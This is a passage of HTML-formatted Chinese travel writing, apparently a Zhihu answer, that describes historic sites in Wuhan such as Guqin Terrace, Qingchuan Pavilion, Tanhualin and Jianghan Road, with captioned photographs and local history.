data-private-watermark-src=\"v2-261cc503666873f252401b5ad49bd80c\"></p>\n<p>所谓的“两座”，另一座指的是缅甸莆甘时代阿难陀佛寺。</p>\n<p>阿难陀寺网上也称阿南达寺（音译），建于公元11世纪蒲甘王朝时期因为模仿印度石窟佛寺建筑风格，建筑学上也称缅印佛寺建筑风格也称东方风格，源头古印度。</p>\n<p> 有一点是没有疑问的：无论古德寺和阿难陀寺相似度的多少，古德寺的建筑风格在中国内陆也是一枝独秀一朵奇葩，打破千年汉文化圈佛寺建筑刻板固定模式，直接去南亚佛教古国寻求设计灵感。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-33bf2c59ab05d5d5b5074afc904c78a9_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"古德寺大殿四周透空围廊——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-33bf2c59ab05d5d5b5074afc904c78a9\" data-watermark-src=\"v2-92f4f3504d638893d6a039e7fe185cd3\" data-private-watermark-src=\"v2-c8fbf35a086d740ffef3685446312380\"></p>\n<p>古德寺重建于20世纪初，建成于20世纪三十年代，除了借鉴印缅石窟佛寺建筑格局外，同时借鉴欧洲中世纪教堂建筑精华，哥特风、罗马风、希腊风、伊斯兰风，当然最主要的还是印度风和缅甸风（即缅印风）。</p>\n<p>1995年，武汉市政府拨款300万元重修古德寺。1996年，古德寺重兴宗教活动。</p>\n<p>1954年10月，印度总理贾瓦哈拉尔·尼赫鲁访华从北京来武汉，女儿英迪拉.甘地（1966当选为印度总理）同行，父女二人专程来汉口参观古德寺——这件事我父亲特别清楚，当年他在湖北省新闻传媒界任比较重要的职务。</p>\n<p><b>小结</b>：以上几座古建筑，感兴趣的朋友还是可以游一下的，譬如说我们游杭州西湖不会错过灵隐寺；那么我们来武汉为什么不花点时间游几处历史悠久、建筑精美、文化丰富、自然环境幽雅的中华传统木架构古建筑群呢？这样的建筑物历经沧桑保存下来，每一块砖石、每一根梁木都值得我们百倍珍惜。</p>\n<h3>天地之间黄鹤楼</h3>\n<p>游武汉黄鹤楼肯定是首推荐——古迹名胜特别是中国传统木架构古建筑，想要从古保存到今天很难很难，千百年来如果依然存在的话，往往毁了建建了毁反复许多次，黄鹤楼也一样。</p>\n<p>古迹名胜到此一游，古董是价值之一不是全部，历史文化抚今追昔也是游览一大乐趣。今天新建黄鹤楼并不仅仅只是一座楼阁，而是一座规模宏大面积阔大园林山林建筑群风景区，绵延数里分布在整座蛇山山脊包括山坡……</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b4f8e9859ba5aa8ffd68bf308dcfd9a5_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"黄鹤楼面朝长江，面朝西方，面朝汉江入长江口，这是历代游人登楼观风景送别赋诗写文的那一个方向——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-b4f8e9859ba5aa8ffd68bf308dcfd9a5\" data-watermark-src=\"v2-5b5047dd551eca7526f312fb7c0b4222\" data-private-watermark-src=\"v2-4a9774d25d4697e439925c275b64681b\"></p>\n<p>下面介绍主要是黄鹤楼建设历史始末，也是武昌城建城历史始末，感兴趣可以点开读一下。如果只需要一个百字内景点简介的就不必点开了。话说到前头！</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/question/463692637/answer/2066224265\" data-image=\"https://pic2.zhimg.com/v2-fb90c0ebf02477e2ab5db70132f06d7e_200x0.jpg\" data-image-width=\"2736\" data-image-height=\"3648\" class=\"internal\">武汉黄鹤楼既然是新建的，游览价值是什么？</a><h3>高山流水古琴台</h3>\n<p><img src=\"https://pic1.zhimg.com/v2-c0e2f362cc721e313b6797ce95a624fe_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1536\" data-size=\"normal\" data-caption=\"汉阳古琴台公园濒临通衢大道交通非常方便——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-c0e2f362cc721e313b6797ce95a624fe\" data-watermark-src=\"v2-96ff48e9f70c6f9b19f4656948bc6471\" data-private-watermark-src=\"v2-ea0278977e3bd1075cee74ccaa909107\"></p>\n<p>复制粘贴一段我的散文：</p>\n<p>……汉阳，自古以来舟车往返、商贾云集，自古以来烽烟连绵、争战频繁。古琴台近临通衢大道，所以每每遭遇劫难，由是屡建屡毁、屡毁屡建。1956年，政府拨款全面修复，才有了今天的琴台公园。</p>\n<p>古琴台建筑群，虽然占地不大，但是建筑格局十分精致。庭院、园林、茶室、殿堂、回廊，一步一景、层叠重复，宛转优雅如楚辞。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8d174849054a10642582a47d128c63f6_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1536\" data-size=\"normal\" data-caption=\"黄樱子在琴台公园进门甬道——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-8d174849054a10642582a47d128c63f6\" data-watermark-src=\"v2-f514dd3112d33b22320e7b8656df197f\" data-private-watermark-src=\"v2-5cb03fe5409afd039502c967df20b79d\"></p>\n<p>庭院深深，林木森森，砖石甬道湿润润洁净如洗……阁子翘檐在如洗碧天下高高地朝两端飞起，琉璃瓦在金阳里变幻着或蓝或绿的光泽。阁前一棵百年老松，针叶团团盘盘，巨大的树冠四方伸展，绿荫翳了整整一个园子。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4895e46dba0c4baab759b6548b680bb4_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"古琴台，台基和碑是真正古迹——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-4895e46dba0c4baab759b6548b680bb4\" data-watermark-src=\"v2-3bd95d4d274092aed4a62d3ba3f15277\" data-private-watermark-src=\"v2-e5254f36aae35bf2884423535f9a57a5\"></p>\n<p>汉白玉雕筑的古琴台是清代的遗迹，四周栏板上雕凿出精美灵秀的人物故事，台中立碑刻字，摘录历史典籍有关伯牙和钟子期的故事。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-919ab367ce660f34722f605df364a188_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1536\" data-size=\"normal\" data-caption=\"图上石雕石刻都是真正古迹——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-919ab367ce660f34722f605df364a188\" data-watermark-src=\"v2-09f8413a0919532dc3deb487077c2051\" data-private-watermark-src=\"v2-5adb04ee91fbc3c314a6c2e0ede5cc0f\"></p>\n<p>1977年8月22日，《高山流水》的曲子被刻录入一张镀金光盘，由美国“航天者”号太空船携带升空，在太空反复播放，向广阔无垠的宇宙传播地球文明的信息<b>（胡榴明散文《古琴台》）。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0e9cea5df140561ba97625c74abc1377_720w.jpg?rss\" data-rawwidth=\"3000\" data-rawheight=\"2000\" data-size=\"normal\" data-caption=\"古琴台公园一景——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-0e9cea5df140561ba97625c74abc1377\" data-watermark-src=\"v2-70348edf1ff2b353b2aad136435a6f94\" data-private-watermark-src=\"v2-c33f8bf33978fc38d6356ef5c3bcaa34\"></p>\n<p>——古琴台的记载最早见于南北朝，北宋时建在汉阳蔡甸，相传伯牙和钟子期在那一段汉江边相遇，当地还有子期村和子期墓等传说中的遗址遗迹。两千年前的龟山（大别山）脚下江湖浩汤不方便泊船，史载“江夏汉江口”所指范围比今天宽广得多。明代，古琴台从蔡甸移往汉阳城郊，借助古城的繁华为千年古迹生辉，后来湮没一段时间。清湖广总督毕沅（字秋帆）于乾隆年间在汉阳月湖畔主持重建，自此古琴台归属汉阳月湖。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1d72002c5d9c3d332d1d7f802011603a_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"汉阳月湖位于古琴台公园和琴台大剧院、琴台音乐厅之间，同属琴台艺术中心——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-1d72002c5d9c3d332d1d7f802011603a\" data-watermark-src=\"v2-4a23b582babb40e3e5a3b8f0aab2bc0b\" data-private-watermark-src=\"v2-575035ca20ed25d8020170420be98f6a\"></p>\n<p>现在古琴台游览就不仅仅是上述的一个小公园了，见下文：</p>\n<p>2007年11月8日，与古琴台一湖相隔的琴台文化艺术中心正式揭幕开园。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-dcd7feba797cd60eea0275403fddcb80_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"琴台大剧院——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-dcd7feba797cd60eea0275403fddcb80\" data-watermark-src=\"v2-9aa434c6cd13a14535513281863b3bc1\" data-private-watermark-src=\"v2-805367ccef3e1b2695351993a45db92b\"></p>\n<p>因古琴台而得名的琴台文化艺术中心，是武汉市最大的文化主题公园，总体面积2.15平方公里，建筑面积50万平方米，依汉水，朝龟山，滨月湖，一项规模极其宏大的建筑群，包括月湖北岸的琴台大剧院和琴台音乐厅；月湖南岸的凤凰广场、万人露天剧院、月影舞台；月湖东面的知音岛和唱歌雕塑；东南侧的音乐森林及西南面的莲花湖湿地……</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f4958402b3389e15188041d84aaccc02_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"琴台音乐厅——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-f4958402b3389e15188041d84aaccc02\" data-watermark-src=\"v2-983f380444a46f7551648df0a7e6de28\" data-private-watermark-src=\"v2-26ecefed49fa86a0c2fae37fc2dd93e5\"></p>\n<p> 夜幕降临，月亮升起，湖水闪着淡淡的光亮，湖的另一边是古琴台。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6e0c785e338f1c0e39a6438037be6265_720w.jpg?rss\" data-rawwidth=\"2532\" data-rawheight=\"1424\" data-size=\"normal\" data-caption=\"初秋月湖刚刚凋谢的荷花和肥大的荷叶。荷花是月湖一整个夏天的风景——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-6e0c785e338f1c0e39a6438037be6265\" data-watermark-src=\"v2-ddabd00740f3223a73026a723d5d21b3\" data-private-watermark-src=\"v2-d4fdd5b8c677bd42731fcfae305568b5\"></p>\n<p>《汉口竹枝词》记载，月湖琴台当年是南来北往的商旅和武汉三镇的市民最喜爱的游览地，连夏天乘凉都不嫌路远地往这里跑，说这里比城里凉快得多（当时月湖在汉阳城郊）。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ccba936d2a73d8612e4413f41b3e99df_720w.jpg?rss\" data-rawwidth=\"2532\" data-rawheight=\"1424\" data-size=\"normal\" data-caption=\"琴台音乐厅隔湖对面是古琴台公园，中间有木道石桥相通——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-ccba936d2a73d8612e4413f41b3e99df\" data-watermark-src=\"v2-0200c076cad0d06a31c3bcbdb96a238c\" data-private-watermark-src=\"v2-16700b3bb1429778db0a53f67e83de66\"></p>\n<h3>汉阳晴川阁、铁门关、大禹文化园（风景区之间相互连接）</h3>\n<p>晴川阁建于明朝初年，与黄鹤楼一江之隔。</p>\n<p>往来的游人经常是先游武昌（古名江夏、鄂州等）黄鹤楼，然后由汉阳门（古黄鹤楼脚下武昌古城门西门）船码头乘木船渡江（一直有轮渡），在龟山脚汉阳城外登岸游玩晴川阁，或者反之。</p>\n<p>晴川阁晚建于黄鹤楼一千多年，自建成之后便得四方游人的倾慕，究其原因，依然是崔颢的诗。</p>\n<p>“晴川历历汉阳树，芳草凄凄鹦鹉洲”（《登黄鹤楼》）</p>\n<p>因一句诗而起一座楼，可见文人对于社会的影响力度。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a5b9a431d4ca537b7a5cfd446b4fe440_720w.jpg?rss\" data-rawwidth=\"2692\" data-rawheight=\"1812\" data-size=\"normal\" data-caption=\"长江江心（过江轮渡上）看晴川阁——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-a5b9a431d4ca537b7a5cfd446b4fe440\" data-watermark-src=\"v2-32d775f8220a40ac0868f55783927703\" data-private-watermark-src=\"v2-3fc6e299095e26a3c6e495e86172a2db\"></p>\n<p>游览晴川阁自然是要等得天气晴好的时候。</p>\n<p>阁楼后面的一方庭院是禹王庙，记念大禹当年疏江导河的功绩——当年（明初）地方官先建禹王庙（意在镇水）“顺带”建晴川阁，没想到后者比前者更出名。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-58a255be1a7052e2558c691b21f7a310_720w.jpg?rss\" data-rawwidth=\"1944\" data-rawheight=\"2592\" data-size=\"normal\" data-caption=\"禹王庙建在龟山脚长江边，图为禹王庙庭院大门——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-58a255be1a7052e2558c691b21f7a310\" data-watermark-src=\"v2-dcd958dd634d587d69a54adcbdb18f34\" data-private-watermark-src=\"v2-cffbbc968d32012c387d34be9f7915e8\"></p>\n<p>清光绪十七年的春末（1891年4月20日），力倡洋务运动而名震中外的湖广总督张之洞迎宾酒宴摆在晴川阁盛情款待俄皇太子尼古拉（末代沙皇尼古拉二世），因为汉口华俄茶叶贸易。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ae5cacb44d85154fdd9ec01fd41fe1ba_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"晴川阁前禹王矶上朝宗亭,传言大禹治水成功于此,取尚书,江汉朝宗于海之意.亭下是毛会建手书山高水长的石刻碑——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-ae5cacb44d85154fdd9ec01fd41fe1ba\" data-watermark-src=\"v2-d2ad69e6a9371f83fa75f6caa4f40766\" data-private-watermark-src=\"v2-fc2e3b9ad0393bf62f2dc52917da74e3\"></p>\n<p>这一天， 张之洞即兴赋诗书赠宾客——“日丽晴川开琦席，花明汉水迓霓旌”。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cc15e8ebec46da7ac52b4beed92af77a_720w.jpg?rss\" data-rawwidth=\"1944\" data-rawheight=\"2592\" data-size=\"normal\" data-caption=\"晴川阁楼上，山高水长四个字是明末文人（古建筑保护者）毛会建手迹——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-cc15e8ebec46da7ac52b4beed92af77a\" data-watermark-src=\"v2-9faf26bf87d3ee6743febc6959ba7382\" data-private-watermark-src=\"v2-0523281b3aa28bfdade6a497beecd353\"></p>\n<p>晴川阁公园包括铁门关：“吴魏相争，设关于此”。吴主孙权为了阻挡北魏西蜀建城防御建铁门关，唐宋明清这一带成为商贸聚集地，明末年铁门关被毁，民国年间这一段江岸日渐冷落。上世纪末政府拨资修复战乱损坏（阳夏之战被清军炮轰损毁部分）的晴川阁，同期在汉阳洗马长街凌空重建铁门关。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2bb40f5441e6e491b4308f28a44595a9_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"晴川阁旁洗马长街横跨铁门关，可从晴川阁公园里边登城楼——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-2bb40f5441e6e491b4308f28a44595a9\" data-watermark-src=\"v2-b336efbf0c7fff926b83f3d2d19795fc\" data-private-watermark-src=\"v2-9d1c995d4a06399252b0803c41d811bd\"></p>\n<p>走出晴川阁，上洗马长街，左转，走进大禹神话园，也就是汉阳江滩公园。</p>\n<p>先游禹王庙，再游大禹神话园，其实是一条顺理成章的旅游线路。</p>\n<p>远古洪水肆虐，于是有了大禹在此劈山泄洪的神话传说，于是有了禹王庙，于是有了今天的大禹神话园（汉阳江滩公园之一）。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fcc0fc4aebde9919422f0b2bc7aa6475_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"黄樱子在大禹治水大型雕塑前——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-fcc0fc4aebde9919422f0b2bc7aa6475\" data-watermark-src=\"v2-1bfdad8eb1762c7189cb38980ec646e6\" data-private-watermark-src=\"v2-78dd2e2b94a2c69d619e749d59690037\"></p>\n<p>背面龟山电视塔，侧面桥头堡，武汉三镇最美的大型雕塑墙，圆雕和浮雕，赭黄色的石材，雕工精美，气势磅礴。</p>\n<h3>风光人文昙华林</h3>\n<p>武昌昙华林，位于古武昌城东北城门武胜门内螃蟹岬以西一条古巷，历史可上朔到明洪武四年（公元1371年），从古到今兴毁数次，最近一次修复重建工程，2012年开始，至今还没有全部完成。</p>\n<p>2016年武汉大学出版社约稿写《昙华林》，从这一年起每隔不久来昙华林晃荡一次。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2630b0cdfc6cc32020c07ac020135e32_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"昙华林街——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-2630b0cdfc6cc32020c07ac020135e32\" data-watermark-src=\"v2-4d3cafe97e51610b309412abd70bd1b3\" data-private-watermark-src=\"v2-284d6e5520d032e5668be61d8693c06d\"></p>\n<p>我去一般两条路线：自驾导航武昌昙华林街，小东门中山路路边湖北美术学院旁边一条小街就是。另一条路线搭乘武汉地铁2号线螃蟹岬站，A2出口，站口商圈吃喝玩乐，然后横向朝昙华林小街步行300米，右转朝长江方向沿小街边走边看，这就是来昙华林的玩法。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-01d61e74b6067fcb2c3cfa810d19d3e0_720w.jpg?rss\" data-rawwidth=\"2976\" data-rawheight=\"3968\" data-size=\"normal\" data-caption=\"地铁2号线螃蟹岬站距离昙华林街300米——摄影冯慧\" data-watermark=\"watermark\" data-original-src=\"v2-01d61e74b6067fcb2c3cfa810d19d3e0\" data-watermark-src=\"v2-cd955b5322d57bf1417a11884a58a9e5\" data-private-watermark-src=\"v2-c39e8e1eb3f9d4c263ed827e68947406\"></p>\n<p>看什么呢？</p>\n<p>虽说是一条古街，但战乱毁掉明清古建筑（中国传统古典建筑），现在人来昙华林主要参观四大教区遗留下来的近现代西式建筑，由建筑了解历史了解文化了解城市建设发展轨迹——现代人称旅游为文化旅游，即此。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4e604ec232e55a1929dfea023953d016_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"昙华林街——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-4e604ec232e55a1929dfea023953d016\" data-watermark-src=\"v2-e932a7d434b58cb15155b132ac9ba2a4\" data-private-watermark-src=\"v2-06a19dc76dac9ff3e2af66d9b9cb3c89\"></p>\n<p>昙华林街边戈甲营44号基督教崇真堂，武昌第一座基督教堂，也是武汉现存年代最早的一所基督教教堂（图片略，自己照上面地址去找吧）。</p>\n<p>基督教伦敦会杨格非牧师是战乱后重兴昙华林第一人，除这座小教堂外还在戈甲营办学校在花园山办医院（武昌仁济医院）。 </p>\n<p><img src=\"https://pic4.zhimg.com/v2-0e9bd5c5bd62d5659e4f90be8671f6e0_720w.jpg?rss\" data-rawwidth=\"5472\" data-rawheight=\"3648\" data-size=\"normal\" data-caption=\"杨格非主持创建武昌仁济医院，规模之大没有进去的人真想不到，目前没有对外开放，只能隔着围栏看看——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-0e9bd5c5bd62d5659e4f90be8671f6e0\" data-watermark-src=\"v2-83ca9b7ee008e6dff38dfe050d717046\" data-private-watermark-src=\"v2-9d4e09bb2ebc3589e8f35759f9459bb5\"></p>\n<p>文华书院旧址，武昌昙华林188号，湖北中医药大学昙华林校区内。</p>\n<p>1868年6月，美国圣公会中国地区主教韦廉臣，买下花园山土地先建教堂后建学校，重兴昙华林，继英国伦敦会杨格非牧师之后。</p>\n<p>荒草乱坟的小山开发成风景优美的西式学堂，中文名文华书院，英文名布恩纪念学堂（威廉.琼斯.布恩，中文名文惠廉，美圣公会中国教区第一任主教，一生在中国致力于现代教育业）。</p>\n<p>昙华林圣诞堂，文华书院创建之始的标志。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8817ab2c33f02145da9fb9549b741fa4_720w.jpg?rss\" data-rawwidth=\"2288\" data-rawheight=\"1712\" data-size=\"normal\" data-caption=\"圣诞堂在湖北中医药学院校园中央高地上，建于1870年——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-8817ab2c33f02145da9fb9549b741fa4\" data-watermark-src=\"v2-fba629574cf215324f89f48e89395d56\" data-private-watermark-src=\"v2-80363e053d2bee6caf760bf41926b199\"></p>\n<p>1917年，文华大学、博文书院、博学书院以大学部合并组建华中大学，校址设在昙华林文华大学校区（湖北中医药学院昙华林校区），武汉三镇第一所高等院校诞生。</p>\n<p>华中大学正式建立，大兴土木建设新教学楼、新学生宿舍、新教师宿舍，花园洋房建筑。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d6ce871259f6988ff7b82684dc4ca9cd_720w.jpg?rss\" data-rawwidth=\"2288\" data-rawheight=\"1712\" data-size=\"normal\" data-caption=\"文华书院（当时华中大学）时期的学生宿舍——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-d6ce871259f6988ff7b82684dc4ca9cd\" data-watermark-src=\"v2-9e4a78b9007476544ecce6da9acb3827\" data-private-watermark-src=\"v2-4fac1194b09c55ae035ba655c2c1695b\"></p>\n<p>翟雅阁健身所，20世纪初，文华大学校长孟良佐（美国人，美圣公会湘鄂地区第二任主教）为纪念前任校长翟雅各（英国人）而建，武汉三镇第一所室内体育场，中式古典风格的西式建筑，文物价值极高。近年政府投资修复一新。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c3eb8024b7915134c9d1c1d2d3aca86c_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"960\" data-size=\"normal\" data-caption=\"翟雅阁位于昙华林街边，非常好找——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-c3eb8024b7915134c9d1c1d2d3aca86c\" data-watermark-src=\"v2-5abe0867cc805e8b45cdcb9b4e859940\" data-private-watermark-src=\"v2-47524943adcadc97b1e389f306661ab8\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d041c5f9c6a4c2b33557a522ccc95d77_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"从花园山上看瑞典教区牧师楼，树很美，房子很美——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-d041c5f9c6a4c2b33557a522ccc95d77\" data-watermark-src=\"v2-14e7e9821cf690fd9ca9892558618f7e\" data-private-watermark-src=\"v2-6a13c0379ee0add716f386f8f7ddbd66\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f36bd9d2cb0933f91f29d3138a2d16eb_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"昙华林街边小山上的树特别美——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-f36bd9d2cb0933f91f29d3138a2d16eb\" data-watermark-src=\"v2-58eb634b3102e4dcbafc2c8739831338\" data-private-watermark-src=\"v2-f0388ff5d785654c6b0a01cec74a96e7\"></p>\n<p>花园山顶嘉诺撒修女小教堂（天主教武昌传教区建筑）修复一新，十年前荒草断石夕阳残照的颓废风景没有了，喜欢修复后的新建筑，怀念以前看到的老风景。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-84412431ea4cd2125225bf7c3b310104_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"花园山顶嘉诺撒修女小教堂——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-84412431ea4cd2125225bf7c3b310104\" data-watermark-src=\"v2-943aae2ffbdbe40a6b59b8d03674fcb8\" data-private-watermark-src=\"v2-bf138b71e6e6c5374b6f2b10d8e093e8\"></p>\n<p>往胭脂路方向寻找花园山天主堂和主教公署（今中南神哲学院），19世纪末建筑，建筑本身的价值就不用多说了。</p>\n<p>到任何一个城市旅游我都会寻找宗教建筑，中国古典式（佛寺道观）和西方建筑式（教堂）我都喜欢（个人没有任何宗教信仰）。知道从古至今人们舍得为信仰花钱，宗教建筑的美从来吸引爱好建筑者。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5b2899a86acdaa5a878c713b0d610c54_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"中南神哲学院原主教公署内设图书馆藏书很多（花园山天主教堂就在此建筑隔壁，可以自己去寻找参观）——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-5b2899a86acdaa5a878c713b0d610c54\" data-watermark-src=\"v2-d695d7ebd2fd7d5b3dcc102735153100\" data-private-watermark-src=\"v2-a043df1433fb57e5326c2f5554f5f127\"></p>\n<p>昙华林街心小广场高台上（其实就是山坡上）融园咖啡馆，当地人称牧师楼，原为昙华林瑞典教区主持牧师住宅。小楼外露天木台热咖啡、冰琪琳，小楼内彩色玻璃灯罩华夫饼、煲仔饭，两人对坐时光最美。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-175be7de4bbda952bb04b23a69809a8f_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"960\" data-size=\"normal\" data-caption=\"本文作者胡榴明（左）2017年秋天在瑞典行道会教区牧师公寓现咖啡馆前接受《大武汉》视频采访，关于著作《昙华林》——摄影《大武汉》影视摄制组\" data-watermark=\"watermark\" data-original-src=\"v2-175be7de4bbda952bb04b23a69809a8f\" data-watermark-src=\"v2-b83cec064f9867ae05289bf99d0a8973\" data-private-watermark-src=\"v2-f324c97a4d55bfd91623e3c3e02c9795\"></p>\n<p>出融园顺昙华林主街朝长江方向走，沿路树影摇曳红灯闪烁，小餐馆、小酒吧、咖啡吧、网吧、奶茶店、饰品店，一直延续到小街顶端。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-44c687b3ee626d04884a0062d1615697_720w.jpg?rss\" data-rawwidth=\"5472\" data-rawheight=\"3648\" data-size=\"normal\" data-caption=\"昙华林街，可能现在已经变化了。因为一直在修建在改造，总之相信会越来越好越来越美——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-44c687b3ee626d04884a0062d1615697\" data-watermark-src=\"v2-99f49e4d6b54e88254526f552d9fa469\" data-private-watermark-src=\"v2-50321e1a8883deec460bd99c1a011b75\"></p>\n<h3>汉口江汉路——中国最长步行街</h3>\n<p>汉口江汉路，老汉口的心脏，起于沿江大道，穿过中山大道、京汉大道，止于新华路。</p>\n<p>始建于清末，逐渐形成汉口商贸集散地，19世纪末因紧邻英租界，扩宽成为碎石马路迅速成为闹市中心。大地产商刘歆生将此路延伸到汉口北郊循礼门（今京汉大道循礼门地铁站一带）刘家花园（刘歆生私家园林，已毁）。英租界工部局报请英女王维多利亚批复，命名歆生路，后和英租界边缘一段合并改名为江汉路。</p>\n<p>2000年，政府将北起江汉四路，南至沿江大道一段定为步行街，长度为1210米，为国内最长的一条步行商业街。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-998ddd25e8e890725cc2e79bb2ecaf66_720w.jpg?rss\" data-rawwidth=\"3130\" data-rawheight=\"2075\" data-size=\"normal\" data-caption=\"江汉路璇宫饭店（1949年前武汉三镇最奢华的大饭店）的门童——胡榴明摄于2005年\" data-watermark=\"watermark\" data-original-src=\"v2-998ddd25e8e890725cc2e79bb2ecaf66\" data-watermark-src=\"v2-dba6277531ab05b173203fa51ab6ce31\" data-private-watermark-src=\"v2-335e9801293ad03e5cc2b1aa37d09a82\"></p>\n<p>江汉路两侧的建筑主要为商埠、饭店、银行、医院、报社、办公楼等，全部西式建筑，老汉口人称“洋房子”。来街上玩，只逛不买，看看老洋房子也是挺好的。在中国，老洋房遍地的城市毕竟不算多。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c82ccdb328de8d021d36821f77e7f723_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"江汉路往京汉大道方向一段——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-c82ccdb328de8d021d36821f77e7f723\" data-watermark-src=\"v2-96f536c328a387178aed018e6e23c76e\" data-private-watermark-src=\"v2-67eac4b9c8ac09047f8710a50d4f5ea6\"></p>\n<p>历史悠久，商业繁茂，百年建筑沿街林立。位于汉口老城区，吃喝玩乐样样都有，老牌子门店和新品牌店埠比邻增辉。夜晚，霓虹灯金光闪烁，满街时尚男女，欢声笑语，游玩逛街，天天过大节的感觉。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a80a22e0bf76001a65133407aebfb77c_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"江汉路最美丽的建筑中心百货公司（旧国货商店）——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-a80a22e0bf76001a65133407aebfb77c\" data-watermark-src=\"v2-db566fe00624f4979380054f02d14afa\" data-private-watermark-src=\"v2-cfcec3468ee3ee91682345353942c0f4\"></p>\n<p>最优秀的街道品质是：没一家店的商业姿态专门拉客外省市游客——没有品牌扎堆（各式各样的大店和小店），没有邀客兜售（可能武汉人商业感不强吧），对本市人怎样对外地人怎样，永远亲和，永远日常，永远时尚如初，百年一日摩登老街，不游等于白来一趟汉口。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5f6777da7156924a92e3a5388f35a4bb_720w.jpg?rss\" 